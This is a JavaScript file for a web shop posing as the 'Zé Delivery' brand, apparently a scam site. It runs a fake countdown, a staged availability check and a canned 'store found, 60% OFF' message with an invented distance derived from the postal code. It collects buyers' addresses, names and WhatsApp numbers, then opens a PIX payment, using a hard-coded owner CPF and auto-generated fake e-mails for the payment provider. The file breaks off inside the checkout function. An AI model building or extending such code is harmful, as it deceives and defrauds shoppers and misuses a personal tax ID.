// ===== Zé Delivery - JavaScript =====

// Image paths (local)
var IMG = {
  zeDelivery: "images/ze-delivery-logo.jpg",
  motoboy: "images/motoboy.png",
  zeIcon: "images/ze-icon.png",
  img1: "images/img1.png",
  img2: "images/img2.png",
  img3: "images/img3.png",
  img4: "images/img4.png",
  img5: "images/img5.png",
  img6: "images/img6.png",
  img7: "images/img7.png",
  img8: "images/img8.png",
  img9: "images/img9.png",
  img10: "images/img10.png",
  img11: "images/img11.png"
};

/* ===== CONFIGURAÇÕES DO DONO ===== */
var ZE_OWNER_CPF = '056.718.976-70';

/* Gera e-mails sequenciais para a Freepay (pedido01@gmail.com, pedido02@gmail.com…) */
function gerarEmailPedido() {
  var n = parseInt(localStorage.getItem('ze_email_seq') || '0') + 1;
  localStorage.setItem('ze_email_seq', String(n));
  return 'pedido' + String(n).padStart(2, '0') + '@gmail.com';
}

/* ===== COOKIE HELPERS ===== */
function setCookie(name, value, days) {
  var expires = new Date(Date.now() + days * 864e5).toUTCString();
  document.cookie = name + "=" + encodeURIComponent(value) + "; expires=" + expires + "; path=/";
}

function getCookie(name) {
  var cookies = document.cookie.split("; ");
  for (var i = 0; i < cookies.length; i++) {
    var parts = cookies[i].split("=");
    if (parts[0] === name) return decodeURIComponent(parts[1] || "");
  }
  return "";
}

/* ===== GEOLOCATION ===== */
async function fetchLocation() {
  try {
    var response = await fetch("https://get.geojs.io/v1/ip/geo.json");
    var data = await response.json();
    return { city: data.city || "Local Desconhecido", region: data.region || "Local Desconhecido" };
  } catch (e) {
    return { city: "Local Desconhecido", region: "Local Desconhecido" };
  }
}

/* ===== MAP STATE NAMES TO UF ===== */
var estadosNomeParaUF = {};
for (var uf in estadosInput) {
  estadosNomeParaUF[estadosInput[uf]] = uf;
}

// ===== Store Status =====
(function() {
  var statusLoja = document.getElementById("status-loja");
  if (statusLoja) statusLoja.textContent = "ABERTO";
})();

// ===== Countdown Timer =====
(function() {
  var INITIAL_MINUTES = 16;
  var INITIAL_SECONDS = 33;
  var STORAGE_KEY = "countdownEndTime";

  function getEndTime() {
    var saved = localStorage.getItem(STORAGE_KEY);
    var now = Date.now();
    if (saved) {
      var savedTime = parseInt(saved, 10);
      if (!isNaN(savedTime) && savedTime > now) return savedTime;
    }
    var durationMs = (INITIAL_MINUTES * 60 + INITIAL_SECONDS) * 1000;
    var newEndTime = now + durationMs;
    localStorage.setItem(STORAGE_KEY, String(newEndTime));
    return newEndTime;
  }

  var countdownEndTime = getEndTime();

  function updateCountdown() {
    var now = Date.now();
    var remaining = Math.floor((countdownEndTime - now) / 1000);
    if (remaining < 0) remaining = 0;
    var minutes = Math.floor(remaining / 60);
    var seconds = remaining % 60;
    document.querySelectorAll("#minutes").forEach(function(el) {
      el.textContent = String(minutes).padStart(2, "0");
    });
    document.querySelectorAll("#seconds").forEach(function(el) {
      el.textContent = String(seconds).padStart(2, "0");
    });
  }

  setInterval(updateCountdown, 1000);
  updateCountdown();
})();


// ===== Update Location Display =====
function atualizarLocalizacao() {
  var cidade = getCookie("localCidade");
  var estado = getCookie("localEstado");
  if (cidade) {
    document.querySelectorAll(".local-cidade").forEach(function(el) { el.textContent = cidade; });
  }
  if (estado) {
    document.querySelectorAll(".local-estado").forEach(function(el) { el.textContent = estado; });
  }
}

/* ===== AGE VERIFICATION ===== */
async function verificarIdade() {
  var result = await Swal.fire({
    html: '<p style="font-size:20px;color:#333;font-weight:700;font-family:\'Poppins\',sans-serif;margin:10px 0 4px;">Você tem 18 anos ou mais?</p>',
    showDenyButton: true,
    confirmButtonText: "SIM",
    denyButtonText: "NÃO",
    confirmButtonColor: "#FFCC00",
    denyButtonColor: "#FFFFFF",
    allowOutsideClick: false,
    allowEscapeKey: false,
    didOpen: function () {
      var confirmBtn = document.querySelector(".swal2-confirm");
      var denyBtn    = document.querySelector(".swal2-deny");
      var actions    = document.querySelector(".swal2-actions");
      if (confirmBtn) {
        confirmBtn.style.color = "#1A1A1A"; confirmBtn.style.backgroundColor = "#FFCC00";
        confirmBtn.style.minWidth = "120px"; confirmBtn.style.fontSize = "16px";
        confirmBtn.style.fontWeight = "700"; confirmBtn.style.borderRadius = "6px";
        confirmBtn.style.padding = "12px 32px"; confirmBtn.style.border = "none";
      }
      if (denyBtn) {
        denyBtn.style.color = "#1A1A1A"; denyBtn.style.backgroundColor = "#FFFFFF";
        denyBtn.style.minWidth = "120px"; denyBtn.style.fontSize = "16px";
        denyBtn.style.fontWeight = "700"; denyBtn.style.borderRadius = "6px";
        denyBtn.style.padding = "12px 32px"; denyBtn.style.border = "2px solid #CCCCCC";
      }
      if (actions) actions.style.gap = "32px";
    }
  });
  return result.value === true;
}

async function acessoNegado() {
  await Swal.fire({
    title: "Acesso Negado",
    text: "Você deve ter 18 anos ou mais para acessar este site.",
    icon: "error",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    allowEscapeKey: false,
    didOpen: function() {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) { btn.style.color = "#1A1A1A"; btn.style.border = "none"; }
    }
  });
}

/* ===== LOCATION FLOW ===== */

/* Monta o formulário de endereço — layout compacto e visual bonito */
function buildEnderecoForm(prefill, opts) {
  opts = opts || {};
  function esc(v) { return (v || '').replace(/"/g, '&quot;'); }

  var inp = 'width:100%;box-sizing:border-box;padding:11px 13px;font-size:16px;'
    + 'font-family:\'Poppins\',sans-serif;border:1.5px solid #e8e8e8;border-radius:10px;'
    + 'background:#fafafa;color:#1a1a1a;outline:none;display:block;margin:0;';

  var lbl = 'display:block;font-size:10px;font-weight:700;color:#aaa;'
    + 'text-transform:uppercase;letter-spacing:.6px;margin-bottom:5px;';

  function f(id, ph, val, extraInp) {
    return '<input id="' + id + '" placeholder="' + ph + '"'
      + (val ? ' value="' + esc(val) + '"' : '')
      + ' style="' + inp + (extraInp || '') + '">';
  }

  function row(label, input) {
    return '<div style="margin-bottom:10px">'
      + '<label style="' + lbl + '">' + label + '</label>'
      + input
      + '</div>';
  }

  var cepLabel = opts.cepOpcional
    ? 'CEP <span style="color:#ccc;font-weight:400;text-transform:none;letter-spacing:0;font-size:10px">(opcional)</span>'
    : 'CEP';
  var cepPh = opts.cepOpcional ? '00000-000 (opcional)' : '00000-000';

  return ''
    /* Cabeçalho amarelo */
    + '<div style="background:#ffcc01;margin:-1.25em -1.6em 18px;padding:13px 20px;'
    +   'display:flex;align-items:center;gap:9px;border-radius:5px 5px 0 0">'
    +   '<i class="fa fa-map-marker-alt" style="font-size:17px;color:#1a1a1a"></i>'
    +   '<span style="font-weight:700;font-size:13px;color:#1a1a1a;font-family:\'Poppins\',sans-serif">'
    +     'Confirme o endereço de entrega</span>'
    + '</div>'

    + '<div style="text-align:left">'
    + row(cepLabel, f('end-cep', cepPh, prefill.cep || '', 'letter-spacing:2px;'))
    + row('Rua / Avenida', f('end-rua', 'Nome da rua', prefill.logradouro || ''))

    /* Número + Complemento lado a lado */
    + '<div style="display:flex;gap:8px;margin-bottom:10px">'
    +   '<div style="width:40%">'
    +     '<label style="' + lbl + '">Número</label>'
    +     f('end-numero', 'Nº', '')
    +     '<label style="display:flex;align-items:center;gap:5px;margin-top:6px;cursor:pointer">'
    +       '<input type="checkbox" id="end-sn" style="width:15px;height:15px;accent-color:#ffcc01;cursor:pointer;flex-shrink:0">'
    +       '<span style="font-size:11px;color:#888;font-family:\'Poppins\',sans-serif">S/N (sem número)</span>'
    +     '</label>'
    +   '</div>'
    +   '<div style="flex:1">'
    +     '<label style="' + lbl + '">Complemento</label>'
    +     f('end-compl', 'Apto, bloco...', '')
    +   '</div>'
    + '</div>'

    + row('Bairro', f('end-bairro', 'Bairro', prefill.bairro || ''))

    /* Cidade + Estado lado a lado */
    + '<div style="display:flex;gap:8px">'
    +   '<div style="flex:1">'
    +     '<label style="' + lbl + '">Cidade</label>'
    +     f('end-cidade', 'Cidade', prefill.localidade || '')
    +   '</div>'
    +   '<div style="width:28%">'
    +     '<label style="' + lbl + '">UF</label>'
    +     f('end-estado', 'UF', prefill.uf || '', 'text-transform:uppercase;text-align:center;letter-spacing:2px;')
    +   '</div>'
    + '</div>'
    + '</div>';
}

/* Abre o modal de endereço editável.
   prefill: dados do ViaCEP ou {}
   opts: { cepOpcional: true } quando vindo do fluxo "Não sei meu CEP" */
async function modalEndereco(prefill, opts) {
  opts = opts || {};
  var endResult = await Swal.fire({
    html: buildEnderecoForm(prefill, opts),
    confirmButtonText: "Ver ofertas →",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    allowEscapeKey: false,
    padding: '1.25em 1.6em 1.6em',
    didOpen: function() {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) {
        btn.style.color = "#1A1A1A"; btn.style.fontWeight = "700";
        btn.style.border = "none"; btn.style.width = "100%";
        btn.style.borderRadius = "12px"; btn.style.fontSize = "15px";
        btn.style.padding = "14px";
      }

      /* Foco amarelo nos inputs */
      document.querySelectorAll('#swal2-html-container input').forEach(function(inp) {
        inp.addEventListener('focus', function() { this.style.borderColor = '#ffcc01'; this.style.background = '#fff'; });
        inp.addEventListener('blur',  function() { this.style.borderColor = '#e8e8e8'; this.style.background = '#fafafa'; });
      });

      /* Máscara CEP + re-busca ViaCEP ao digitar */
      document.getElementById('end-cep').addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,8);
        if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
        this.value = v;
        if (v.replace('-','').length === 8) {
          fetch('https://viacep.com.br/ws/' + v.replace('-','') + '/json/')
            .then(function(r){ return r.json(); })
            .then(function(d){
              if (!d.erro) {
                document.getElementById('end-rua').value    = d.logradouro || '';
                document.getElementById('end-bairro').value = d.bairro     || '';
                document.getElementById('end-cidade').value = d.localidade || '';
                document.getElementById('end-estado').value = d.uf         || '';
                document.getElementById('end-numero').focus();
              }
            }).catch(function(){});
        }
      });

      /* Checkbox S/N */
      document.getElementById('end-sn').addEventListener('change', function() {
        var numInput = document.getElementById('end-numero');
        if (this.checked) {
          numInput.value = 'S/N';
          numInput.disabled = true;
          numInput.style.opacity = '0.45';
          numInput.style.borderColor = '#e8e8e8';
        } else {
          numInput.value = '';
          numInput.disabled = false;
          numInput.style.opacity = '1';
          numInput.focus();
        }
      });

      /* Estado sempre maiúsculo */
      document.getElementById('end-estado').addEventListener('input', function() {
        this.value = this.value.toUpperCase().replace(/[^A-Z]/g,'');
      });

      /* Foca no primeiro campo vazio (pula CEP quando opcional) */
      setTimeout(function() {
        var ids = opts.cepOpcional
          ? ['end-rua','end-numero','end-bairro','end-cidade','end-estado']
          : ['end-cep','end-rua','end-numero','end-bairro','end-cidade','end-estado'];
        var first = ids.find(function(id) { return !document.getElementById(id).value; });
        document.getElementById(first || 'end-numero').focus();
      }, 120);
    },
    preConfirm: function() {
      var cep    = document.getElementById('end-cep').value.trim();
      var rua    = document.getElementById('end-rua').value.trim();
      var numero = document.getElementById('end-numero').value.trim();
      var compl  = document.getElementById('end-compl').value.trim();
      var bairro = document.getElementById('end-bairro').value.trim();
      var cidade = document.getElementById('end-cidade').value.trim();
      var estado = document.getElementById('end-estado').value.trim();
      /* CEP: obrigatório no fluxo normal; opcional mas validado se preenchido no fluxo sem CEP */
      if (!opts.cepOpcional && (!cep || cep.replace('-','').length !== 8)) {
        Swal.showValidationMessage('Informe um CEP válido.'); return false;
      }
      if (opts.cepOpcional && cep && cep.replace('-','').length !== 8) {
        Swal.showValidationMessage('CEP inválido — verifique os dígitos.'); return false;
      }
      if (!rua)    { Swal.showValidationMessage('Informe a rua/avenida.');  return false; }
      if (!numero) { Swal.showValidationMessage('Informe o número ou marque S/N.'); return false; }
      if (!bairro) { Swal.showValidationMessage('Informe o bairro.');        return false; }
      if (!cidade) { Swal.showValidationMessage('Informe a cidade.');        return false; }
      if (!estado || estado.length !== 2) { Swal.showValidationMessage('Informe o estado (UF, ex: SP).'); return false; }
      return { cep: cep, rua: rua, numero: numero, compl: compl, bairro: bairro, cidade: cidade, estado: estado };
    }
  });
  return endResult;
}

/* ── Coleta nome + WhatsApp após o Parabéns (opcional — pode pular) ── */
async function modalContato() {
  var saved = {};
  try { saved = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}

  var ctInp = 'display:block;width:100%;box-sizing:border-box;padding:12px 14px;font-size:16px;'
            + 'font-family:\'Poppins\',sans-serif;border:1.5px solid #e8e8e8;border-radius:10px;'
            + 'background:#fafafa;color:#1a1a1a;outline:none;';

  /* ── 2ª visita: mostra card de confirmação ── */
  if (saved.nome && saved.tel) {
    var wantEdit = false;
    await Swal.fire({
      html: '<div style="font-family:\'Poppins\',sans-serif">'
          + '<div style="background:#ffcc01;margin:-1.25em -1.6em 18px;padding:13px 20px;'
          +   'display:flex;align-items:center;gap:9px;border-radius:5px 5px 0 0">'
          +   '<i class="fa-brands fa-whatsapp" style="font-size:19px;color:#1a1a1a"></i>'
          +   '<span style="font-weight:700;font-size:13px;color:#1a1a1a">Confirme seus dados</span>'
          + '</div>'
          + '<p style="font-size:13px;color:#888;margin-bottom:12px;text-align:center">Seus dados de contato:</p>'
          + '<div style="background:#f8f8f8;border:1px solid #eee;border-radius:10px;padding:12px 14px;text-align:left">'
          +   '<div style="font-size:15px;font-weight:700;color:#1a1a1a">' + saved.nome.replace(/</g,'&lt;') + '</div>'
          +   '<div style="font-size:13px;color:#666;margin-top:3px">' + saved.tel.replace(/</g,'&lt;') + '</div>'
          + '</div>'
          + '</div>',
      confirmButtonText:  'Confirmar →',
      confirmButtonColor: '#FFCC00',
      allowOutsideClick:  false,
      allowEscapeKey:     false,
      padding: '1.25em 1.6em 1.6em',
      footer: '<a id="btn-edit-contato" href="#" style="color:#888;font-size:13px;text-decoration:underline;cursor:pointer">Alterar informações</a>',
      didOpen: function() {
        var btn = document.querySelector('.swal2-confirm');
        if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; btn.style.border = 'none'; btn.style.width = '100%'; btn.style.borderRadius = '12px'; btn.style.fontSize = '15px'; btn.style.padding = '14px'; }
        document.getElementById('btn-edit-contato').addEventListener('click', function(e) {
          e.preventDefault();
          wantEdit = true;
          Swal.close();
        });
      }
    });
    if (!wantEdit) return; // confirmado — mantém dados
    // quer editar — cai no formulário abaixo com dados pré-preenchidos
  }

  /* ── Formulário (1ª visita ou edição) ── */
  var skipContato = false;
  var nomeVal = saved.nome ? ' value="' + saved.nome.replace(/"/g,'&quot;') + '"' : '';
  var telVal  = saved.tel  ? ' value="' + saved.tel.replace(/"/g,'&quot;') + '"'  : '';

  var result = await Swal.fire({
    html: '<div style="font-family:\'Poppins\',sans-serif">'
        + '<div style="background:#ffcc01;margin:-1.25em -1.6em 18px;padding:13px 20px;'
        +   'display:flex;align-items:center;gap:9px;border-radius:5px 5px 0 0">'
        +   '<i class="fa-brands fa-whatsapp" style="font-size:19px;color:#1a1a1a"></i>'
        +   '<span style="font-weight:700;font-size:13px;color:#1a1a1a">Acompanhe seu pedido!</span>'
        + '</div>'
        + '<p style="font-size:14px;color:#555;margin-bottom:16px;text-align:center">'
        +   'Informe seu WhatsApp para avisarmos quando seu pedido estiver a caminho 🛵</p>'
        + '<input id="ct-nome" placeholder="Nome completo *" maxlength="80"' + nomeVal
        +   ' style="' + ctInp + 'margin-bottom:10px">'
        + '<input id="ct-tel" placeholder="WhatsApp * (DDD + número)" maxlength="15" inputmode="numeric"' + telVal
        +   ' style="' + ctInp + '">'
        + '</div>',
    confirmButtonText:  'Salvar →',
    confirmButtonColor: '#FFCC00',
    allowOutsideClick:  false,
    allowEscapeKey:     false,
    padding: '1.25em 1.6em 1.6em',
    footer: '<a id="btn-skip-contato" href="#" style="color:#ccc;font-size:13px;text-decoration:underline;cursor:pointer">Informar depois</a>',
    didOpen: function() {
      var btn = document.querySelector('.swal2-confirm');
      if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; btn.style.border = 'none'; btn.style.width = '100%'; btn.style.borderRadius = '12px'; btn.style.fontSize = '15px'; btn.style.padding = '14px'; }
      document.querySelectorAll('#swal2-html-container input').forEach(function(inp) {
        inp.addEventListener('focus', function() { this.style.borderColor = '#ffcc01'; this.style.background = '#fff'; });
        inp.addEventListener('blur',  function() { this.style.borderColor = '#e8e8e8'; this.style.background = '#fafafa'; });
      });
      document.getElementById('ct-tel').addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,11);
        if (v.length > 10) v = '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
        else if (v.length > 6)  v = '('+v.slice(0,2)+') '+v.slice(2,6)+'-'+v.slice(6);
        else if (v.length > 2)  v = '('+v.slice(0,2)+') '+v.slice(2);
        this.value = v;
      });
      document.getElementById('btn-skip-contato').addEventListener('click', function(e) {
        e.preventDefault();
        skipContato = true;
        Swal.close();
      });
      setTimeout(function() {
        var el = document.getElementById(saved.nome ? 'ct-tel' : 'ct-nome');
        if (el && !el.value) el.focus();
      }, 100);
    },
    preConfirm: function() {
      var nome = document.getElementById('ct-nome').value.trim();
      var tel  = document.getElementById('ct-tel').value.replace(/\D/g,'');
      if (!nome || nome.split(/\s+/).length < 2) { Swal.showValidationMessage('Informe seu nome e sobrenome.'); return false; }
      if (tel.length < 10 || tel.length > 11)    { Swal.showValidationMessage('Telefone inválido — informe DDD + número.'); return false; }
      return { nome: nome, tel: document.getElementById('ct-tel').value.trim() };
    }
  });

  if (skipContato || !result.value) return;
  localStorage.setItem('ze_contato', JSON.stringify(result.value));
}

/* ── Distância pseudo-aleatória, consistente por CEP (5,2km–5,8km) ── */
function distanciaPorCep(cep) {
  var digits = cep.replace(/\D/g, '');
  var seed = 0;
  for (var i = 0; i < digits.length; i++) {
    seed += parseInt(digits[i]) || 0;
  }
  /* seed varia de 0 a 72; mapeamos para 7 valores (5.2, 5.3 … 5.8) */
  var dist = 5.2 + ((seed % 7) * 0.1);
  return dist.toFixed(1).replace('.', ',');
}

async function escolherLocalizacao() {
  var cidade = getCookie("localCidade");
  var estado = getCookie("localEstado");

  /* Fallback: se o cookie expirou mas o localStorage ainda tem o endereço,
     restaura sem mostrar o modal novamente */
  if (!cidade || !estado) {
    try {
      var endSaved = localStorage.getItem('ze_endereco');
      if (endSaved) {
        var end = JSON.parse(endSaved);
        if (end.cidade && end.estado) {
          cidade = end.cidade;
          estado = end.estado;
          setCookie("localCidade", cidade, 365);
          setCookie("localEstado",  estado,  365);
        }
      }
    } catch(e) {}
  }

  if (cidade && estado) { atualizarLocalizacao(); return; }

  /* ── Etapa 1: verificação de idade ── */
  var adulto = await verificarIdade();
  if (!adulto) {
    await acessoNegado();
    var adulto2 = await verificarIdade();
    if (!adulto2) {
      await acessoNegado();
      window.location.href = 'https://www.google.com';
      return;
    }
  }

  /* ── Etapa 2: CEP (com "Não sei meu CEP") ── */
  var skipCep = false;
  var cepData = {};

  var cepResult = await Swal.fire({
    html: '<p style="font-size:16px;color:#333;font-weight:700;font-family:\'Poppins\',sans-serif;line-height:1.45;margin:0 0 16px;">'
        + 'Esta oferta é exclusiva para regiões selecionadas. Informe seu CEP para verificar a disponibilidade.</p>'
        + '<input id="modal-cep" placeholder="CEP (00000-000)" maxlength="9" inputmode="numeric"'
        + ' style="display:block;width:100%;box-sizing:border-box;padding:12px 14px;font-size:16px;font-family:\'Poppins\',sans-serif;'
        + 'border:1.5px solid #d9d9d9;border-radius:10px;outline:none;text-align:center;letter-spacing:1px;">',
    confirmButtonText: "Verificar disponibilidade",
    confirmButtonColor: "#FFCC00",
    allowOutsideClick: false,
    allowEscapeKey: false,
    footer: '<a id="btn-nao-sei-cep" href="#" style="color:#888;font-size:13px;text-decoration:underline;cursor:pointer;">Não sei meu CEP</a>',
    didOpen: function() {
      var btn = document.querySelector(".swal2-confirm");
      if (btn) { btn.style.color = "#1A1A1A"; btn.style.fontWeight = "700"; btn.style.border = "none"; }
      document.getElementById('modal-cep').addEventListener('input', function() {
        var v = this.value.replace(/\D/g,'').slice(0,8);
        if (v.length > 5) v = v.slice(0,5)+'-'+v.slice(5);
        this.value = v;
      });
      setTimeout(function() { document.getElementById('modal-cep').focus(); }, 100);
      document.getElementById('btn-nao-sei-cep').addEventListener('click', function(e) {
        e.preventDefault();
        skipCep = true;
        Swal.close();
      });
    },
    preConfirm: async function() {
      var cep = document.getElementById('modal-cep').value.replace(/\D/g,'');
      if (cep.length !== 8) { Swal.showValidationMessage('Por favor, informe um CEP válido.'); return false; }
      try {
        var r = await fetch('https://viacep.com.br/ws/' + cep + '/json/');
        var d = await r.json();
        if (d.erro) { Swal.showValidationMessage('CEP não encontrado. Verifique e tente novamente.'); return false; }
        return d;
      } catch(e) { Swal.showValidationMessage('Erro ao buscar CEP. Tente novamente.'); return false; }
    }
  });

  /* Usuário fechou sem confirmar e sem clicar em "Não sei meu CEP" */
  if (!skipCep && !cepResult.value) return;
  if (!skipCep) cepData = cepResult.value;

  /* ── Fluxo com CEP  : Loading → Parabéns → Contato → Endereço ── */
  /* ── Fluxo sem CEP  : Estado → Cidade → Loading → Parabéns → Contato ── */

  var scrollY = window.scrollY;
  var endDados;

  if (skipCep) {
    /* ── Etapa A: Estado (pré-selecionado por geolocalização de IP) ── */
    var geoSkip = await fetchLocation();
    var ufSkip  = estadosNomeParaUF[geoSkip.region] || '';

    var stateResult = await Swal.fire({
      html: '<p style="font-size:17px;color:#333;font-weight:700;font-family:\'Poppins\',sans-serif;line-height:1.4;margin-bottom:6px">'
          +   'Esta oferta é exclusiva para regiões selecionadas.</p>'
          + '<p style="font-size:14px;color:#666;margin:0">Informe sua região para verificar a disponibilidade:</p>',
      input: 'select',
      inputOptions: estadosInput,
      inputPlaceholder: 'Escolha seu estado',
      inputValue: ufSkip,
      confirmButtonText: 'Próximo →',
      confirmButtonColor: '#FFCC00',
      allowOutsideClick: false,
      allowEscapeKey: false,
      inputValidator: function(value) { return value ? undefined : 'Por favor, escolha seu estado.'; },
      didOpen: function() {
        var btn = document.querySelector('.swal2-confirm');
        if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; btn.style.border = 'none'; btn.style.width = '100%'; btn.style.borderRadius = '8px'; btn.style.padding = '12px'; }
      }
    });

    if (!stateResult.value) return;
    var estadoSkip = stateResult.value;

    /* ── Etapa B: Cidade ── */
    var cidadesSkip   = (typeof cidadesPorEstado !== 'undefined' && cidadesPorEstado[estadoSkip]) || [];
    var cidadesOpts   = {};
    for (var ci = 0; ci < cidadesSkip.length; ci++) { cidadesOpts[String(ci)] = cidadesSkip[ci]; }
    var preselectSkip = cidadesSkip.indexOf(geoSkip.city);

    var cityResult = await Swal.fire({
      title: 'Agora, selecione a cidade',
      input: 'select',
      inputOptions: cidadesOpts,
      inputValue: preselectSkip >= 0 ? String(preselectSkip) : '',
      confirmButtonText: 'Conferir disponibilidade →',
      confirmButtonColor: '#FFCC00',
      allowOutsideClick: false,
      allowEscapeKey: false,
      inputValidator: function(value) { return value ? undefined : 'Por favor, escolha sua cidade.'; },
      didOpen: function() {
        var btn = document.querySelector('.swal2-confirm');
        if (btn) { btn.style.color = '#1A1A1A'; btn.style.fontWeight = '700'; btn.style.border = 'none'; btn.style.width = '100%'; btn.style.borderRadius = '8px'; btn.style.padding = '12px'; }
      }
    });

    if (cityResult.value === undefined) return;
    var cidadeSkip = cidadesSkip[Number(cityResult.value)];

    /* ── Loading ── */
    await Swal.fire({
      title: "Verificando disponibilidade na sua região...",
      html: 'Procurando lojas participantes em <b>' + cidadeSkip + '</b>...',
      timer: 2200,
      timerProgressBar: true,
      allowOutsideClick: false,
      didOpen: function() { Swal.showLoading(); }
    });

    /* ── Parabéns ── */
    await Swal.fire({
      html: '<div style="font-family:\'Poppins\',sans-serif;text-align:left">'
          + '<p style="font-size:16px;font-weight:700;color:#1a1a1a;line-height:1.5;margin-bottom:16px;text-align:center">'
          + '🎉 Parabéns! Encontramos uma loja com promoções até <span style="color:#077c22">60% OFF</span> perto de você, aproveite!</p>'
          + '<div style="background:#fffbe6;border:1.5px solid #ffcc01;border-radius:12px;padding:14px 16px">'
          + '<div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:12px">'
          + '<i class="fa fa-map-marker-alt" style="color:#b8960a;font-size:15px;margin-top:2px;flex-shrink:0"></i>'
          + '<span style="font-size:14px;color:#1a1a1a;line-height:1.4"><b>Distância:</b> aproximadamente 5,2km</span>'
          + '</div>'
          + '<div style="display:flex;align-items:flex-start;gap:10px">'
          + '<i class="fa fa-clock" style="color:#b8960a;font-size:15px;margin-top:2px;flex-shrink:0"></i>'
          + '<span style="font-size:14px;color:#1a1a1a;line-height:1.4"><b>Prazo de entrega:</b> 30 a 40 minutos após a confirmação da compra</span>'
          + '</div>'
          + '</div>'
          + '</div>',
      icon: "success",
      confirmButtonText: "Ver ofertas →",
      confirmButtonColor: "#FFCC00",
      allowOutsideClick: false,
      allowEscapeKey: false,
      didOpen: function() {
        var btn = document.querySelector(".swal2-confirm");
        if (btn) {
          btn.style.color = "#1A1A1A"; btn.style.fontWeight = "700";
          btn.style.border = "none"; btn.style.width = "100%";
          btn.style.borderRadius = "12px"; btn.style.fontSize = "15px";
          btn.style.padding = "14px";
        }
      }
    });

    /* ── Endereço completo (cidade/estado já pré-preenchidos, sem CEP) ── */
    document.body.style.position = 'fixed';
    document.body.style.top = '-' + scrollY + 'px';
    document.body.style.width = '100%';

    var endResultSkip = await modalEndereco({ localidade: cidadeSkip, uf: estadoSkip }, { cepOpcional: true });

    document.body.style.position = '';
    document.body.style.top = '';
    document.body.style.width = '';

    (function() {
      var vp = document.querySelector('meta[name="viewport"]');
      if (!vp) return;
      var original = vp.getAttribute('content');
      vp.setAttribute('content', original + ', maximum-scale=1');
      setTimeout(function() { vp.setAttribute('content', original); }, 300);
    })();

    if (!endResultSkip.value) return;
    endDados = endResultSkip.value;

    /* ── Contato (opcional) ── */
    await modalContato();

  } else {
    /* ── Etapa 3: loading ── */
    await Swal.fire({
      title: "Verificando disponibilidade na sua região...",
      html: 'Procurando lojas participantes' + (cepData.localidade ? ' em <b>' + cepData.localidade + '</b>' : '') + '...',
      timer: 2200,
      timerProgressBar: true,
      allowOutsideClick: false,
      didOpen: function() { Swal.showLoading(); }
    });

    /* ── Etapa 4: parabéns ── */
    var distancia = distanciaPorCep(cepData.cep || '');
    await Swal.fire({
      html: '<div style="font-family:\'Poppins\',sans-serif;text-align:left">'
          + '<p style="font-size:16px;font-weight:700;color:#1a1a1a;line-height:1.5;margin-bottom:16px;text-align:center">'
          + '🎉 Parabéns! Encontramos uma loja com promoções até <span style="color:#077c22">60% OFF</span> perto de você, aproveite!</p>'
          + '<div style="background:#fffbe6;border:1.5px solid #ffcc01;border-radius:12px;padding:14px 16px">'
          + '<div style="display:flex;align-items:flex-start;gap:10px;margin-bottom:12px">'
          + '<i class="fa fa-map-marker-alt" style="color:#b8960a;font-size:15px;margin-top:2px;flex-shrink:0"></i>'
          + '<span style="font-size:14px;color:#1a1a1a;line-height:1.4"><b>Distância:</b> aproximadamente ' + distancia + 'km</span>'
          + '</div>'
          + '<div style="display:flex;align-items:flex-start;gap:10px">'
          + '<i class="fa fa-clock" style="color:#b8960a;font-size:15px;margin-top:2px;flex-shrink:0"></i>'
          + '<span style="font-size:14px;color:#1a1a1a;line-height:1.4"><b>Prazo de entrega:</b> 30 a 40 minutos após a confirmação da compra</span>'
          + '</div>'
          + '</div>'
          + '</div>',
      icon: "success",
      confirmButtonText: "Confirmar endereço →",
      confirmButtonColor: "#FFCC00",
      allowOutsideClick: false,
      allowEscapeKey: false,
      didOpen: function() {
        var btn = document.querySelector(".swal2-confirm");
        if (btn) {
          btn.style.color = "#1A1A1A"; btn.style.fontWeight = "700";
          btn.style.border = "none"; btn.style.width = "100%";
          btn.style.borderRadius = "12px"; btn.style.fontSize = "15px";
          btn.style.padding = "14px";
        }
      }
    });

    /* ── Etapa 5: formulário de endereço ── */
    document.body.style.position = 'fixed';
    document.body.style.top = '-' + scrollY + 'px';
    document.body.style.width = '100%';

    var endResultCep = await modalEndereco(cepData);

    document.body.style.position = '';
    document.body.style.top = '';
    document.body.style.width = '';

    (function() {
      var vp = document.querySelector('meta[name="viewport"]');
      if (!vp) return;
      var original = vp.getAttribute('content');
      vp.setAttribute('content', original + ', maximum-scale=1');
      setTimeout(function() { vp.setAttribute('content', original); }, 300);
    })();

    if (!endResultCep.value) { window.scrollTo(0, scrollY); return; }
    endDados = endResultCep.value;

    /* ── Contato (opcional) ── */
    await modalContato();
  }

  /* ── Salva cookies e dados para pré-preencher checkout ── */
  setCookie("localCidade", endDados.cidade, 365);
  setCookie("localEstado",  endDados.estado, 365);
  localStorage.setItem('ze_endereco', JSON.stringify({
    cep:    endDados.cep,
    rua:    endDados.rua,
    bairro: endDados.bairro,
    cidade: endDados.cidade,
    estado: endDados.estado,
    numero: endDados.numero,
    compl:  endDados.compl
  }));

  atualizarLocalizacao();
  window.scrollTo({ top: 0, behavior: 'smooth' });
}

// ===== PIX CHECKOUT =====

var pixAtualCodigo = '';

async function abrirCheckoutPix(el) {
  var produto        = el.getAttribute('data-produto');
  var valor          = parseFloat(el.getAttribute('data-valor'));
  var imgSrc         = el.getAttribute('data-img');
  var valorFormatado = valor.toFixed(2).replace('.', ',');

  // ── Dados salvos ──────────────────────────────────────────────────────────
  var contato = {};
  var end = {};
  try { contato = JSON.parse(localStorage.getItem('ze_contato') || '{}'); } catch(e) {}
  try { end = JSON.parse(localStorage.getItem('ze_endereco') || '{}'); } catch(e) {}

  function fmtTelDisplay(raw) {
    var v = (raw || '').replace(/\D/g,'').slice(0,11);
    if (v.length > 10) return '('+v.slice(0,2)+') '+v.slice(2,7)+'-'+v.slice(7);
